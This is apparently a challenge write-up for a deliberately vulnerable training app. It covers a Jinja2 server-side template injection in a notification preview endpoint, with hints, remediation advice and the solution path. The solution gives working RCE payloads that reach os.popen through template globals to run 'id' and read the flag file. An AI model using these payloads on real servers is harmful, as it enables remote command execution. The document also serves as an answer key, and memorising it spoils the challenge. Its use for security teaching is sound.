# ssti_notification

| Field | Value |
|---|---|
| OWASP | A03:2021 Injection |
| CWE | CWE-1336 |
| Difficulty | Hard |
| Chains into | SSTI → remote code execution on the app server |

## Vulnerable code
`modules/ssti_notification/routes.py: preview_notification()` builds the
Jinja2 template **source** with an f-string: `f"<p>Hi {nickname}, ...</p>"`,
then renders it. Every other template render in this codebase passes user
data as context (`render_template("x.html", value=user_input)`), which is
safe — this one is the exception.

## Player path
1. `POST /notifications/preview {"nickname": "{{7*7}}"}` → response contains
   `Hi 49, you have new notifications...` — confirms code execution inside
   the template, not just string interpolation.
2. Full RCE (verified working against this app's exact Jinja2 3.1.6 during
   development, not just theoretical):
   ```
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
   ```
   Response will contain real command output, e.g. `uid=0(root) gid=0(root)...`.
3. For scoring, read the actual flag file the same way and submit its
   contents at `/flags/submit`:
   ```
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /srv/flags/ssti_flag.txt').read() }}
   ```

## Hints
- Hint 1: "What happens if your nickname isn't actually a name?"
- Hint 2: "Compare how this endpoint builds its template versus every other page in the app."

## Remediation
- Never build template source strings from user input. Always use a static template with the untrusted value passed as context: `render_template_string("<p>Hi {{ nickname }}</p>", nickname=nickname)`.
- If dynamic templates are genuinely required, use a sandboxed environment (Jinja2's `SandboxedEnvironment`) as defense in depth — not a substitute for the fix above, but reduces blast radius.
- Least-privilege the app's runtime user/container so even a confirmed RCE has limited value to an attacker.
